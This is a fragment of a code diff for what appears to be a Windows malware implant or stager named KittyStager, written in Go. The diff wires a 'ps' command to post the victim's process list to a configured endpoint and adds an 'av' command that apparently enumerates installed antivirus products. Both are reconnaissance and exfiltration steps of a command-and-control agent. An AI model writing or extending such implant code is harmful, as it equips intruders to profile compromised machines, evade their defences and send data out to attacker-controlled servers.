@@ -1,7 +1,7 @@
 package main
 
 import (
-	"KittyStager/malware"
+	"KittyStager/kitten/malware"
 	"encoding/hex"
 	"fmt"
 	"golang.org/x/sys/windows"
@@ -57,6 +57,17 @@ func main() {
 			}
 		case "ps":
 			ps, err := malware.GetProcessList(key)
+			if err != nil {
+				fmt.Println(err)
+				return
+			}
+			_, err = malware.PostRequest(ps, config.PostEndpoint, *config)
+			if err != nil {
+				fmt.Println(err)
+				return
+			}
+		case "av":
+			ps, err := malware.GetAV(key)
 			if err != nil {
 				fmt.Println(err)
 				return
